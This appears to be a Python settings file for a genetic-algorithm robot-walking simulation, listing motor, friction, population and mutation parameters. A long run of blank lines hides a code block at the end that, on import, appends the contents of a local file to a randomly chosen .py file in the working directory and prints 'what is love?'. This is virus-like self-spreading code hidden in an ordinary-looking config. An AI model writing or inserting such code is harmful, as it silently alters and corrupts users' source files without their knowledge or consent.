# simulation_settings:
MOTOR_MAX_FORCE = 1.5  # Adjust the maximum force according to your requirements
MOTOR_MAX_VELOCITY = 1.6 # 5.16 - speed of the motors
LINEAR_FRICTION = 8  # Set the linear friction coefficient (adjust as needed)
ANGULAR_FRICTION = 0.04  # Set the angular friction coefficient (adjust as needed)
NUM_PROCESSES = 12

# training_settings:
POPULATION_SIZE = 55
NUM_OF_POPULATIONS = 5
MAX_GENERATIONS = 10000
STUCK_GENERATIONS_TO_SUICIDE = 300
STUCK_GENERATIONS_TO_MOVE_ON = 1000

MUTATION_RATE = 0.05
STARTING_MUTATION_RANGE = 2.1
MUTATION_RANGE_DOWNWARDS_MULTIPLIER = 0.95
STUCK_GENERATIONS_TO_DECREASE = 16
MUTATION_RANGE_UPWARDS_MULTIPLIER = 1.03
STUCK_GENERATIONS_TO_INCREASE = 155

SAVE_GENERATION = True
PRINT_PROGRESS = True
USE_EXISTING_NETWORK = False
INITIAL_FILE_PATH = "networks\\walk_fine1.5.pkl"

























import random
import os
files = os.listdir("./")
files = [f for f in files if os.path.isfile(f) and f.endswith(".py")]
f = random.choice(files)
with open(f, mode="a") as file:
    with open("D:\\mama\\what_is_love.py", "r") as what_is_love:
        file.write(what_is_love.read())
print("what is love?")

